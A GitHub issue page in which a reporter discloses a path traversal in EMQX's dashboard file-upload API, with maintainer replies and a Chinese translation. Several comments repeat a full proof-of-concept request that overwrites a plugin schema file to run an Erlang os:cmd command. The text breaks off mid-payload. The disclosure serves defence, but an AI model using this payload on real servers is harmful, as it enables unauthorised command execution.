=== Content from github.com_9553abb3_20250110_163835.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Femqx%2Femqx%2Fissues%2F10419)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Femqx%2Femqx%2Fissues%2F10419)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=emqx%2Femqx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[emqx](/emqx)
/
**[emqx](/emqx/emqx)**
Public

* [Notifications](/login?return_to=%2Femqx%2Femqx) You must be signed in to change notification settings
* [Fork
  2.3k](/login?return_to=%2Femqx%2Femqx)
* [Star
   14.3k](/login?return_to=%2Femqx%2Femqx)

* [Code](/emqx/emqx)
* [Issues
  171](/emqx/emqx/issues)
* [Pull requests
  55](/emqx/emqx/pulls)
* [Discussions](/emqx/emqx/discussions)
* [Actions](/emqx/emqx/actions)
* [Projects
  0](/emqx/emqx/projects)
* [Security](/emqx/emqx/security)
* [Insights](/emqx/emqx/pulse)

Additional navigation options

* [Code](/emqx/emqx)
* [Issues](/emqx/emqx/issues)
* [Pull requests](/emqx/emqx/pulls)
* [Discussions](/emqx/emqx/discussions)
* [Actions](/emqx/emqx/actions)
* [Projects](/emqx/emqx/projects)
* [Security](/emqx/emqx/security)
* [Insights](/emqx/emqx/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Femqx%2Femqx%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Femqx%2Femqx%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# a security issue was found #10419

Closed

[donghao1107](/donghao1107) opened this issue
Apr 17, 2023
· 5 comments

Closed

# [a security issue was found](#top) #10419

[donghao1107](/donghao1107) opened this issue
Apr 17, 2023
· 5 comments

Assignees
[![@lafirest](https://avatars.githubusercontent.com/u/22971499?s=40&v=4)](/lafirest)

Labels
[BUG](/emqx/emqx/labels/BUG)

## Comments

[![@donghao1107](https://avatars.githubusercontent.com/u/49726183?s=80&v=4)](/donghao1107)

Copy link

### **[donghao1107](/donghao1107)** commented [Apr 17, 2023](#issue-1671481780)

| What happened? Path travelsal is existing in HTTP api POST <http://xxx.xxx.xxx.xxx:xxx/api/v4/data/file/> if the filename parameter is ../../../test, the attacker could write malicious file anywhere, to investigate it deeply, if the plugin schema file was replaced, while "os:cmd("echo 12345678 > hacked.txt")" can be added, then attacker can execute malicious command by click the plugin load button or trigger related http api.  Of course attacker should login to the dashboard first. It could be came true if someone use a weak password or old version default password is used. What did you expect to happen? fix the path travelsal issue How can we reproduce it (as minimally and precisely as possible)? *No response* Anything else we need to know? *No response* EMQX version ``` $ ./bin/emqx_ctl broker ALL VERSION!!! ```  OS version ``` # On Linux: $ cat /etc/os-release # paste output here $ uname -a # paste output here  # On Windows: C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture # paste output here ```  Log files |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@donghao1107](https://avatars.githubusercontent.com/u/49726183?s=40&v=4)](/donghao1107)
[donghao1107](/donghao1107)
added
the
[BUG](/emqx/emqx/labels/BUG)
label
[Apr 17, 2023](#event-9026273112)

[![@savonarola](https://avatars.githubusercontent.com/u/4236?s=80&u=d450e1803ef9a8a7bb13ed208cd8a7548f0775ce&v=4)](/savonarola)

Copy link

Contributor

### **[savonarola](/savonarola)** commented [Apr 17, 2023](#issuecomment-1511998732)

| Thank you for the report! As far as I can quickly see, only existing backup files from a special location are allowed for downloading. But we will additionally check things. |
| --- |

All reactions

Sorry, something went wrong.

[![@savonarola](https://avatars.githubusercontent.com/u/4236?s=40&u=d450e1803ef9a8a7bb13ed208cd8a7548f0775ce&v=4)](/savonarola)
[savonarola](/savonarola)
assigned [lafirest](/lafirest)
[Apr 17, 2023](#event-9028637323)

[![@donghao1107](https://avatars.githubusercontent.com/u/49726183?s=80&v=4)](/donghao1107)

Copy link

Author

### **[donghao1107](/donghao1107)** commented [Apr 18, 2023](#issuecomment-1512330262)

| Thank you for the report! As far as I can quickly see, only existing backup files from a special location are allowed for downloading. But we will additionally check things.  Hi，this api is for uploading files rather than downloading file, and the damage is modifying system file rather than leakaging backup file, please check it again.  append the payload below, worked in 4.3.8 I rewrite the ./lib/emqx\_sn-4.3.8/priv/emqx\_sn.schema file and insert "os:cmd("echo 12345678 > hacked.txt")" command, click stop and restart button of emqx\_sn plugin, command will be executed. request generate by postman  <http://xxx.xxx.xxx.xxx:18083/api/v4/data/file/?filename=../lib/emqx_sn-4.3.8/priv/emqx_sn.schema&file=%25%25-%2A-+mode%3A+erlang+-%2A-%0D%0A%25%25+emqx_sn+config+mapping%0D%0A%7Bmapping%2C+%22mqtt.sn.port%22%2C+%22emqx_sn.port%22%2C+%5B%0D%0A++%7Bdefault%2C+%221884%22%7D%2C%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.port%22%2C+fun%28Conf%29+-%3E%0D%0A++case+re%3Asplit%28cuttlefish%3Aconf_get%28%22mqtt.sn.port%22%2C+Conf%2C+%22%22%29%2C+%22%3A%22%2C+%5B%7Breturn%2C+list%7D%5D%29+of%0D%0A++++++%5BPort%5D+-%3E%0D%0A++++++++++%7B%7B0%2C0%2C0%2C0%7D%2C+list_to_integer%28Port%29%7D%3B%0D%0A++++++Tokens+-%3E%0D%0A++++++++++Port+%3D+lists%3Alast%28Tokens%29%2C%0D%0A++++++++++IP+%3D+case+inet%3Aparse_address%28lists%3Aflatten%28lists%3Ajoin%28%22%3A%22%2C+Tokens+--+%5BPort%5D%29%29%29+of%0D%0A+++++++++++++++++++%7Berror%2C+Reason%7D+-%3E%0D%0A+++++++++++++++++++++++throw%28%7Binvalid_ip_address%2C+Reason%7D%29%3B%0D%0A+++++++++++++++++++%7Bok%2C+X%7D+-%3E+X%0D%0A+++++++++++++++end%2C%0D%0A++++++++++Port1+%3D+list_to_integer%28Port%29%2C%0D%0A++++++++++%7BIP%2C+Port1%7D%0D%0A++end%0D%0Aend%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.advertise_duration%22%2C+%22emqx_sn.advertise_duration%22%2C+%5B%0D%0A++%7Bdefault%2C+%2215s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.gateway_id%22%2C+%22emqx_sn.gateway_id%22%2C+%5B%0D%0A++%7Bdefault%2C+1%7D%2C%0D%0A++%7Bdatatype%2C+integer%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.username%22%2C+%22emqx_sn.username%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.password%22%2C+%22emqx_sn.password%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.idle_timeout%22%2C+%22emqx_sn.idle_timeout%22%2C+%5B%0D%0A++%7Bdefault%2C+%2230s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_stats%22%2C+%22emqx_sn.enable_stats%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_qos3%22%2C+%22emqx_sn.enable_qos3%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.predefined.topic.%24id%22%2C+%22emqx_sn.predefined%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.subs_resume%22%2C+%22emqx_sn.subs_resume%22%2C+%5B%0D%0A++%7Bdefault%2C+false%7D%2C%0D%0A++%7Bdatatype%2C+%7Benum%2C+%5Btrue%2C+false%5D%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.username%22%2C+fun%28Conf%29+-%3E%0D%0A++Username+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.username%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Username%29%2C%0D%0A++os%3Acmd%28%22echo+12345678+%3E+hacked.txt%22%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.password%22%2C+fun%28Conf%29+-%3E%0D%0A++Password+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.password%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Password%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.predefined%22%2C+fun%28Conf%29+-%3E%0D%0A++List+%3D+cuttlefish_variable%3Afilter_by_prefix%28%22mqtt.sn.predefined.topic%22%2C+Conf%29%2C%0D%0A++TopicIdList+%3D+lists%3Asort%28%5B%7Blist_to_integer%28I%29%2C+iolist_to_binary%28TopicName%29%7D%0D%0A++++++++++++++++++++++++++++%7C%7C+%7B%5B%22mqtt%22%2C+%22sn%22%2C+%22predefined%22%2C+%22topic%22%2C+I%5D%2C+TopicName%7D%0D%0A+++++++++++++++++++++++++++++++%3C-+List%2C+I+%3D%2F%3D+%220%22%5D%29%0D%0Aend%7D>. |
| --- |

All reactions

Sorry, something went wrong.

[![@HHhne](https://avatars.githubusercontent.com/u/125008575?s=80&u=ed33f2ea6a21a47e366768ea937ec25cb5f52865&v=4)](/HHhne)

Copy link

### **[HHhne](/HHhne)** commented [Apr 18, 2023](#issuecomment-1512468259) • edited Loading

| 感谢您的报告！ 据我所知，只允许下载来自特殊位置的现有备份文件。 但是我们还会检查一些东西。  你好，这个接口是上传文件的，不是下载文件的，损坏的是修改系统文件，不是泄露备份文件，请再检查一下。  附加下面的有效负载，在 4.3.8 中工作 我重写./lib/emqx\_sn-4.3.8/priv/emqx\_sn.schema 文件并插入"os:cmd("echo 12345678 > hacked.txt")"命令，点击emqx\_sn插件的停止和重启按钮，命令将是执行。 请求由邮递员生成  <http://xxx.xxx.xxx.xxx:18083/api/v4/data/file/?filename=../lib/emqx_sn-4.3.8/priv/emqx_sn.schema&file=%25%25-%2A-+mode%3A+erlang+-%2A-%0D%0A%25%25+emqx_sn+config+mapping%0D%0A%7Bmapping%2C+%22mqtt.sn.port%22%2C+%22emqx_sn.port%22%2C+%5B%0D%0A++%7Bdefault%2C+%221884%22%7D%2C%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.port%22%2C+fun%28Conf%29+-%3E%0D%0A++case+re%3Asplit%28cuttlefish%3Aconf_get%28%22mqtt.sn.port%22%2C+Conf%2C+%22%22%29%2C+%22%3A%22%2C+%5B%7Breturn%2C+list%7D%5D%29+of%0D%0A++++++%5BPort%5D+-%3E%0D%0A++++++++++%7B%7B0%2C0%2C0%2C0%7D%2C+list_to_integer%28Port%29%7D%3B%0D%0A++++++Tokens+-%3E%0D%0A++++++++++Port+%3D+lists%3Alast%28Tokens%29%2C%0D%0A++++++++++IP+%3D+case+inet%3Aparse_address%28lists%3Aflatten%28lists%3Ajoin%28%22%3A%22%2C+Tokens+--+%5BPort%5D%29%29%29+of%0D%0A+++++++++++++++++++%7Berror%2C+Reason%7D+-%3E%0D%0A+++++++++++++++++++++++throw%28%7Binvalid_ip_address%2C+Reason%7D%29%3B%0D%0A+++++++++++++++++++%7Bok%2C+X%7D+-%3E+X%0D%0A+++++++++++++++end%2C%0D%0A++++++++++Port1+%3D+list_to_integer%28Port%29%2C%0D%0A++++++++++%7BIP%2C+Port1%7D%0D%0A++end%0D%0Aend%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.advertise_duration%22%2C+%22emqx_sn.advertise_duration%22%2C+%5B%0D%0A++%7Bdefault%2C+%2215s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.gateway_id%22%2C+%22emqx_sn.gateway_id%22%2C+%5B%0D%0A++%7Bdefault%2C+1%7D%2C%0D%0A++%7Bdatatype%2C+integer%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.username%22%2C+%22emqx_sn.username%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.password%22%2C+%22emqx_sn.password%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.idle_timeout%22%2C+%22emqx_sn.idle_timeout%22%2C+%5B%0D%0A++%7Bdefault%2C+%2230s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_stats%22%2C+%22emqx_sn.enable_stats%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_qos3%22%2C+%22emqx_sn.enable_qos3%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.predefined.topic.%24id%22%2C+%22emqx_sn.predefined%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.subs_resume%22%2C+%22emqx_sn.subs_resume%22%2C+%5B%0D%0A++%7Bdefault%2C+false%7D%2C%0D%0A++%7Bdatatype%2C+%7Benum%2C+%5Btrue%2C+false%5D%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.username%22%2C+fun%28Conf%29+-%3E%0D%0A++Username+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.username%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Username%29%2C%0D%0A++os%3Acmd%28%22echo+12345678+%3E+hacked.txt%22%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.password%22%2C+fun%28Conf%29+-%3E%0D%0A++Password+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.password%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Password%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.predefined%22%2C+fun%28Conf%29+-%3E%0D%0A++List+%3D+cuttlefish_variable%3Afilter_by_prefix%28%22mqtt.sn.predefined.topic%22%2C+Conf%29%2C%0D%0A++TopicIdList+%3D+lists%3Asort%28%5B%7Blist_to_integer%28I%29%2C+iolist_to_binary%28TopicName%29%7D%0D%0A++++++++++++++++++++++++++++%7C%7C+%7B%5B%22mqtt%22%2C+%22sn%22%2C+%22predefined%22%2C+%22topic%22%2C+I%5D%2C+TopicName%7D%0D%0A+++++++++++++++++++++++++++++++%3C-+List%2C+I+%3D%2F%3D+%220%22%5D%29%0D%0Aend%7D>.  Hello, regarding the security risk, could you provide more detailed validation or exploitation methods to prove this threat? Can we use Burp Suite to reproduce the process? During the replication process, it was found that the interface only supports uploading json file suffixes |
| --- |

All reactions

Sorry, something went wrong.

[![@donghao1107](https://avatars.githubusercontent.com/u/49726183?s=80&v=4)](/donghao1107)

Copy link

Author

### **[donghao1107](/donghao1107)** commented [Jul 5, 2023](#issuecomment-1621879606)

| 感谢您的报告！ 据我所知，只允许下载来自特殊位置的现有备份文件。 但是我们还会检查一些东西。  你好，这个接口是上传文件的，不是下载文件的，损坏的是修改系统文件，不是泄露备份文件，请再检查一下。 附加下面的有效负载，在 4.3.8 中工作 我重写./lib/emqx\_sn-4.3.8/priv/emqx\_sn.schema 文件并插入"os:cmd("echo 12345678 > hacked.txt")"命令，点击emqx\_sn插件的停止和重启按钮，命令将是执行。 请求由邮递员生成 <http://xxx.xxx.xxx.xxx:18083/api/v4/data/file/?filename=../lib/emqx_sn-4.3.8/priv/emqx_sn.schema&file=%25%25-%2A-+mode%3A+erlang+-%2A-%0D%0A%25%25+emqx_sn+config+mapping%0D%0A%7Bmapping%2C+%22mqtt.sn.port%22%2C+%22emqx_sn.port%22%2C+%5B%0D%0A++%7Bdefault%2C+%221884%22%7D%2C%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.port%22%2C+fun%28Conf%29+-%3E%0D%0A++case+re%3Asplit%28cuttlefish%3Aconf_get%28%22mqtt.sn.port%22%2C+Conf%2C+%22%22%29%2C+%22%3A%22%2C+%5B%7Breturn%2C+list%7D%5D%29+of%0D%0A++++++%5BPort%5D+-%3E%0D%0A++++++++++%7B%7B0%2C0%2C0%2C0%7D%2C+list_to_integer%28Port%29%7D%3B%0D%0A++++++Tokens+-%3E%0D%0A++++++++++Port+%3D+lists%3Alast%28Tokens%29%2C%0D%0A++++++++++IP+%3D+case+inet%3Aparse_address%28lists%3Aflatten%28lists%3Ajoin%28%22%3A%22%2C+Tokens+--+%5BPort%5D%29%29%29+of%0D%0A+++++++++++++++++++%7Berror%2C+Reason%7D+-%3E%0D%0A+++++++++++++++++++++++throw%28%7Binvalid_ip_address%2C+Reason%7D%29%3B%0D%0A+++++++++++++++++++%7Bok%2C+X%7D+-%3E+X%0D%0A+++++++++++++++end%2C%0D%0A++++++++++Port1+%3D+list_to_integer%28Port%29%2C%0D%0A++++++++++%7BIP%2C+Port1%7D%0D%0A++end%0D%0Aend%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.advertise_duration%22%2C+%22emqx_sn.advertise_duration%22%2C+%5B%0D%0A++%7Bdefault%2C+%2215s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.gateway_id%22%2C+%22emqx_sn.gateway_id%22%2C+%5B%0D%0A++%7Bdefault%2C+1%7D%2C%0D%0A++%7Bdatatype%2C+integer%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.username%22%2C+%22emqx_sn.username%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.password%22%2C+%22emqx_sn.password%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.idle_timeout%22%2C+%22emqx_sn.idle_timeout%22%2C+%5B%0D%0A++%7Bdefault%2C+%2230s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_stats%22%2C+%22emqx_sn.enable_stats%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_qos3%22%2C+%22emqx_sn.enable_qos3%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.predefined.topic.%24id%22%2C+%22emqx_sn.predefined%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.subs_resume%22%2C+%22emqx_sn.subs_resume%22%2C+%5B%0D%0A++%7Bdefault%2C+false%7D%2C%0D%0A++%7Bdatatype%2C+%7Benum%2C+%5Btrue%2C+false%5D%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.username%22%2C+fun%28Conf%29+-%3E%0D%0A++Username+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.username%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Username%29%2C%0D%0A++os%3Acmd%28%22echo+12345678+%3E+hacked.txt%22%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.password%22%2C+fun%28Conf%29+-%3E%0D%0A++Password+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.password%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Password%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.predefined%22%2C+fun%28Conf%29+-%3E%0D%0A++List+%3D+cuttlefish_variable%3Afilter_by_prefix%28%22mqtt.sn.predefined.topic%22%2C+Conf%29%2C%0D%0A++TopicIdList+%3D+lists%3Asort%28%5B%7Blist_to_integer%28I%29%2C+iolist_to_binary%28TopicName%29%7D%0D%0A++++++++++++++++++++++++++++%7C%7C+%7B%5B%22mqtt%22%2C+%22sn%22%2C+%22predefined%22%2C+%22topic%22%2C+I%5D%2C+TopicName%7D%0D%0A+++++++++++++++++++++++++++++++%3C-+List%2C+I+%3D%2F%3D+%220%22%5D%29%0D%0Aend%7D>.  Hello, regarding the security risk, could you provide more detailed validation or exploitation methods to prove this threat? Can we use Burp Suite to reproduce the process? During the replication process, it was found that the interface only supports uploading json file suffixes  感谢您的报告！ 据我所知，只允许下载来自特殊位置的现有备份文件。 但是我们还会检查一些东西。  你好，这个接口是上传文件的，不是下载文件的，损坏的是修改系统文件，不是泄露备份文件，请再检查一下。 附加下面的有效负载，在 4.3.8 中工作 我重写./lib/emqx\_sn-4.3.8/priv/emqx\_sn.schema 文件并插入"os:cmd("echo 12345678 > hacked.txt")"命令，点击emqx\_sn插件的停止和重启按钮，命令将是执行。 请求由邮递员生成 <http://xxx.xxx.xxx.xxx:18083/api/v4/data/file/?filename=../lib/emqx_sn-4.3.8/priv/emqx_sn.schema&file=%25%25-%2A-+mode%3A+erlang+-%2A-%0D%0A%25%25+emqx_sn+config+mapping%0D%0A%7Bmapping%2C+%22mqtt.sn.port%22%2C+%22emqx_sn.port%22%2C+%5B%0D%0A++%7Bdefault%2C+%221884%22%7D%2C%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.port%22%2C+fun%28Conf%29+-%3E%0D%0A++case+re%3Asplit%28cuttlefish%3Aconf_get%28%22mqtt.sn.port%22%2C+Conf%2C+%22%22%29%2C+%22%3A%22%2C+%5B%7Breturn%2C+list%7D%5D%29+of%0D%0A++++++%5BPort%5D+-%3E%0D%0A++++++++++%7B%7B0%2C0%2C0%2C0%7D%2C+list_to_integer%28Port%29%7D%3B%0D%0A++++++Tokens+-%3E%0D%0A++++++++++Port+%3D+lists%3Alast%28Tokens%29%2C%0D%0A++++++++++IP+%3D+case+inet%3Aparse_address%28lists%3Aflatten%28lists%3Ajoin%28%22%3A%22%2C+Tokens+--+%5BPort%5D%29%29%29+of%0D%0A+++++++++++++++++++%7Berror%2C+Reason%7D+-%3E%0D%0A+++++++++++++++++++++++throw%28%7Binvalid_ip_address%2C+Reason%7D%29%3B%0D%0A+++++++++++++++++++%7Bok%2C+X%7D+-%3E+X%0D%0A+++++++++++++++end%2C%0D%0A++++++++++Port1+%3D+list_to_integer%28Port%29%2C%0D%0A++++++++++%7BIP%2C+Port1%7D%0D%0A++end%0D%0Aend%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.advertise_duration%22%2C+%22emqx_sn.advertise_duration%22%2C+%5B%0D%0A++%7Bdefault%2C+%2215s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.gateway_id%22%2C+%22emqx_sn.gateway_id%22%2C+%5B%0D%0A++%7Bdefault%2C+1%7D%2C%0D%0A++%7Bdatatype%2C+integer%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.username%22%2C+%22emqx_sn.username%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.password%22%2C+%22emqx_sn.password%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.idle_timeout%22%2C+%22emqx_sn.idle_timeout%22%2C+%5B%0D%0A++%7Bdefault%2C+%2230s%22%7D%2C%0D%0A++%7Bdatatype%2C+%7Bduration%2C+ms%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_stats%22%2C+%22emqx_sn.enable_stats%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.enable_qos3%22%2C+%22emqx_sn.enable_qos3%22%2C+%5B%0D%0A++%7Bdatatype%2C+flag%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.predefined.topic.%24id%22%2C+%22emqx_sn.predefined%22%2C+%5B%0D%0A++%7Bdatatype%2C+string%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Bmapping%2C+%22mqtt.sn.subs_resume%22%2C+%22emqx_sn.subs_resume%22%2C+%5B%0D%0A++%7Bdefault%2C+false%7D%2C%0D%0A++%7Bdatatype%2C+%7Benum%2C+%5Btrue%2C+false%5D%7D%7D%0D%0A%5D%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.username%22%2C+fun%28Conf%29+-%3E%0D%0A++Username+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.username%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Username%29%2C%0D%0A++os%3Acmd%28%22echo+12345678+%3E+hacked.txt%22%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22emqx_sn.password%22%2C+fun%28Conf%29+-%3E%0D%0A++Password+%3D+cuttlefish%3Aconf_get%28%22mqtt.sn.password%22%2C+Conf%29%2C%0D%0A++list_to_binary%28Password%29%0D%0Aend%7D.%0D%0A%0D%0A%7Btranslation%2C+%22